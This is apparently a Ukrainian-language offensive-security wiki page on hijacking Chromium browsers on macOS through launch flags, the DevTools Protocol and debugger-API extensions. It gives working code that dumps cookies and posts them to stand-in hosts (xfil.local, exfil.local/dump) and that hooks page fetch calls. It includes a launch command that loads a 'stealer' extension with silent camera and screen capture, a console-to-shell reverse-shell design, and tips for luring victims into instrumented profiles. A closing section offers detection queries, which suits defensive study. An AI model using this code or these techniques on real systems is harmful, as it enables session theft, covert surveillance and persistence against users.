# Ін’єкція в Chromium на macOS

{{#include ../../../banners/hacktricks-training.md}}

## Основна інформація

Браузери на базі Chromium, такі як Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi та Opera, використовують однакові перемикачі командного рядка, файли налаштувань та інтерфейси автоматизації DevTools. У macOS будь-який користувач із доступом до GUI може завершити наявну сесію браузера та повторно запустити його з довільними flags, extensions або DevTools endpoints, які працюють із entitlements цільового користувача.

#### Запуск Chromium із власними flags у macOS

macOS підтримує лише один екземпляр UI для кожного профілю Chromium, тому для інструментування зазвичай потрібно примусово закрити браузер (наприклад, за допомогою `osascript -e 'tell application "Google Chrome" to quit'`). Attackers зазвичай повторно запускають його через `open -na "Google Chrome" --args <flags>`, щоб інжектити аргументи без зміни app bundle. Обгортання цієї команди в користувацький LaunchAgent (`~/Library/LaunchAgents/*.plist`) або login hook гарантує, що змінений браузер буде повторно запущений після перезавантаження чи виходу із системи.

#### Flag `--load-extension`

Flag `--load-extension` автоматично завантажує unpacked extensions (шляхи розділяються комами). Поєднуйте його з `--disable-extensions-except`, щоб блокувати легітимні extensions і дозволити запуск лише вашого payload. Шкідливі extensions можуть запитувати дозволи з високим рівнем впливу, такі як `debugger`, `webRequest` і `cookies`, щоб отримати доступ до DevTools protocols, змінювати CSP headers, знижувати рівень HTTPS або ексфільтрувати session material одразу після запуску браузера.

#### Flags `--remote-debugging-port` / `--remote-debugging-pipe`

Ці перемикачі відкривають Chrome DevTools Protocol (CDP) через TCP або pipe, щоб зовнішні інструменти могли керувати браузером. Google зафіксувала масштабне використання цього інтерфейсу infostealers і, починаючи з Chrome 136 (березень 2025 року), ці перемикачі ігноруються для default profile, якщо браузер не запущено з нестандартним `--user-data-dir`. Це забезпечує App-Bound Encryption у реальних профілях, однак attackers усе ще можуть створити fresh profile, змусити жертву автентифікуватися в ньому (за допомогою phishing/triage assistance), а потім отримати cookies, tokens, device trust states або WebAuthn registrations через CDP.<sup>[[5]](#references)</sup>

#### Flag `--user-data-dir`

Цей flag перенаправляє весь профіль браузера (History, Cookies, Login Data, Preference files тощо) до шляху, контрольованого attacker. Він обов’язковий під час поєднання сучасних збірок Chrome із `--remote-debugging-port`, а також ізолює змінений профіль, щоб можна було розмістити попередньо заповнені файли `Preferences` або `Secure Preferences`, які вимикають security prompts, автоматично встановлюють extensions і змінюють default schemes.

#### Flag `--use-fake-ui-for-media-stream`

Цей перемикач обходить запит дозволу на використання камери/мікрофона, тому будь-яка сторінка, яка викликає `getUserMedia`, одразу отримує доступ. Поєднуйте його з такими flags, як `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk` або командами CDP `Browser.grantPermissions`, щоб непомітно записувати audio/video, надавати доступ до робочого столу або проходити WebRTC permission checks без взаємодії з користувачем.

## Поширені у реальних атаках способи доставки та повторного запуску

Зловживання CDP зазвичай є етапом **post-exploitation**, а не початковим payload. Нещодавня кампанія проти macOS developer використовувала заражену фазу збірки Xcode **`Run Script`** (`PBXShellScriptBuildPhase`), завдяки чому code виконувався лише тоді, коли жертва **збирала** project, а не просто клонувала чи відкривала його. Після першого виконання malware також заражав інші дерева `.xcodeproj`, додавав шкідливі Git `pre-commit` hooks і шукав додаткові Xcode projects у ZIP archives.<sup>[[3]](#references)</sup>

Для зловживання Chromium це важливо, оскільки attacker не потрібно змінювати сам browser binary. Короткоживучий build-phase / `osascript` stager може натомість встановити **browser wrapper** (LaunchAgent, login item, Dock entry, trojanized app launcher тощо), який щоразу повторно відкриває легітимний браузер із flags, контрольованими attacker.<sup>[[3]](#references)</sup>

> [!TIP]
> На developer endpoints перевіряйте файли `.pbxproj`, `.git/hooks/pre-commit` і ZIPs, що містять `.xcodeproj`, на наявність неочікуваних `curl`, `osascript`, `xxd`, вкладеного `base64` або логіки повторного запуску Chrome.

## Зловживання Remote Debugging і DevTools Protocol

Після повторного запуску Chrome із виділеними `--user-data-dir` і `--remote-debugging-port` можна під’єднатися через CDP (наприклад, за допомогою `chrome-remote-interface`, `puppeteer` або `playwright`) і автоматизувати workflows із високими привілеями:

- **Крадіжка cookies/session:** `Network.getAllCookies` і `Storage.getCookies` повертають значення HttpOnly, навіть коли App-Bound encryption зазвичай блокувала б доступ до файлової системи, оскільки CDP просить запущений браузер розшифрувати їх.
- **Маніпуляції дозволами:** `Browser.grantPermissions` і `Emulation.setGeolocationOverride` дають змогу обходити запити дозволів на камеру/мікрофон (особливо в поєднанні з `--use-fake-ui-for-media-stream`) або підробляти security checks, засновані на місцезнаходженні.
- **Ін’єкція keystrokes/scripts:** `Runtime.evaluate` виконує довільний JavaScript в активній вкладці, що дає змогу викрадати credentials, змінювати DOM або інжектити persistence beacons, які зберігаються після навігації.<sup>[[1]](#references)</sup>
- **Ексфільтрація в реальному часі:** `Network.webRequestWillBeSentExtraInfo` і `Fetch.enable` перехоплюють автентифіковані requests/responses у реальному часі без створення артефактів на диску.
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Оскільки Chrome 136 блокує CDP у профілі за замовчуванням, копіювання наявної у жертви директорії `~/Library/Application Support/Google/Chrome` до staging-шляху більше не дає змоги отримати розшифровані cookies. Натомість використайте social-engineering, щоб змусити користувача автентифікуватися всередині інструментованого профілю (наприклад, під час «корисної» сесії підтримки), або перехоплюйте MFA-токени під час передавання через керовані CDP мережеві hooks.<sup>[[5]](#references)</sup>

### Ланцюжок CDP Backdoor у стилі XCSSET

Практичний шаблон malware:

1. Перезапускайте userland implant або wrapper щоразу під час запуску Chrome.
2. Запускайте легітимний браузер із `--remote-debugging-port=<port>` і, у Chrome 136+, зазвичай із парним непочатковим `--user-data-dir=<dir>`.
3. Запускайте helper, який підключається до локального CDP WebSocket і реєструє pre-document hook за допомогою `Page.addScriptToEvaluateOnNewDocument`.<sup>[[2]](#references)</sup>

Цей helper може інжектити JavaScript **до** виконання коду сайту, що ідеально підходить для hooking `window.fetch`, `XMLHttpRequest`, wallet providers або autofill flows без модифікації файлів на диску.<sup>[[3]](#references)</sup>
```javascript
await Page.enable();
await Runtime.enable();
await Page.addScriptToEvaluateOnNewDocument({
source: `
const oldFetch = window.fetch;
window.fetch = async (...args) => {
console.log('__HT__' + JSON.stringify(args[0]));
return oldFetch(...args);
};
`
});
Runtime.consoleAPICalled(({args}) => { /* helper parses __HT__ */ });
```
Потужніший варіант перетворює браузер на **міст до host-команд**: ін’єктований JavaScript виводить `console.log` із маркером-роздільником, локальний helper відстежує `Runtime.consoleAPICalled`, видаляє маркер, виконує решту через host shell (наприклад, `exec.Command` у Go), а потім повертає stdout/stderr через WebSocket атакувальника. Це перетворює виконання скриптів на рівні вкладки на переважно безфайловий reverse shell.<sup>[[3]](#references)</sup>

## Ін’єкція через Extension за допомогою Debugger API

Дослідження 2023 року "Chrowned by an Extension" продемонструвало, що шкідливий Extension, який використовує API `chrome.debugger`, може під’єднатися до будь-якої вкладки й отримати ті самі можливості DevTools, що й `--remote-debugging-port`.<sup>[[6]](#references)</sup> Це порушує початкові припущення щодо ізоляції (Extensions залишаються у власному контексті) і дає змогу:

- Непомітно викрадати cookies і облікові дані за допомогою `Network.getAllCookies`/`Fetch.getResponseBody`.
- Змінювати дозволи сайтів (камери, мікрофона, геолокації) і обходити security interstitial, що дає phishing-сторінкам змогу імітувати діалоги Chrome.
- Виконувати on-path tampering попереджень TLS, завантажень або запитів WebAuthn шляхом програмного керування через `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior` або `Security.handleCertificateError`.

Завантажте Extension за допомогою `--load-extension`/`--disable-extensions-except`, щоб не вимагати жодної взаємодії з користувачем. Мінімальний background script, який weaponizes цей API, виглядає так:
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
Розширення також може підписуватися на події `Debugger.paused`, щоб читати змінні JavaScript, змінювати inline-скрипти або встановлювати власні точки зупину, які зберігаються після навігації. Оскільки все працює всередині GUI-сесії користувача, Gatekeeper і TCC не активуються, що робить цю техніку ідеальною для malware, яке вже отримало виконання в контексті користувача.<sup>[[6]](#references)</sup>

## Виявлення та пошук

- Створюйте сповіщення про запуск Chromium-браузерів із `--remote-debugging-port`, `--remote-debugging-pipe` або підозрілим `--user-data-dir`, особливо якщо батьківським процесом є `bash`, `sh`, `osascript`, `xcodebuild` або помічник LaunchAgent.
- Шукайте короткі ланцюжки, у яких помічник відкриває локальний CDP WebSocket, реєструє `Page.addScriptToEvaluateOnNewDocument`, а потім встановлює довготривале вихідне WebSocket/HTTPS-з'єднання.
- Виявляйте мости між консоллю та shell, зіставляючи активність браузера `Runtime.consoleAPICalled` із дочірніми shell або процесами-помічниками, які виконують команди, надані attacker.
- На Mac розробників перевіряйте записи `PBXShellScriptBuildPhase` у `.pbxproj`, Git `pre-commit` hooks, перезапускачі Dock/login item і Xcode-проєкти, що містяться в ZIP-архівах, на предмет встановлення browser wrapper.
```bash
ps auxww | rg 'Chrome|Brave|Edge.*(--remote-debugging-port|--remote-debugging-pipe|--user-data-dir)'
lsof -nP -iTCP -sTCP:LISTEN | rg 'Chrome|Brave|Edge'
find ~/Library/LaunchAgents /Library/LaunchAgents -name '*.plist' -exec plutil -p {} \; 2>/dev/null | rg 'remote-debugging|Google Chrome|Brave|Edge'
rg -n 'PBXShellScriptBuildPhase|curl|osascript|xxd|base64' ~/Code --glob '*.pbxproj'
```
### Інструменти

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Автоматизує запуск Chromium із payload extensions і надає інтерактивні CDP hooks.
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - Схожий інструмент, зосереджений на перехопленні трафіку та browser instrumentation для операторів macOS.
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Бібліотека Node.js для сценарного керування дампами Chrome DevTools Protocol (cookies, DOM, permissions), коли запущено екземпляр із `--remote-debugging-port`.

### Приклад
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
Знайдіть більше прикладів за посиланнями на tools.

## Посилання

- [1] [Chrome DevTools Protocol - домен Runtime](https://chromedevtools.github.io/devtools-protocol/v8/Runtime/)
- [2] [Chrome DevTools Protocol - домен Page](https://chromedevtools.github.io/devtools-protocol/tot/Page/)
- [3] [Вбивця Xcode повертається: детальний аналіз останньої версії XCSSET - Unit 42](https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/)
- [4] [Ron Masas (@RonMasas) у X](https://twitter.com/RonMasas/status/1758106347222995007)
- [5] [Зміни перемикачів віддаленого debugging для підвищення безпеки - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [6] [Chrowned by an Extension: зловживання Chrome DevTools Protocol через API Debugger (arXiv:2305.11506)](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
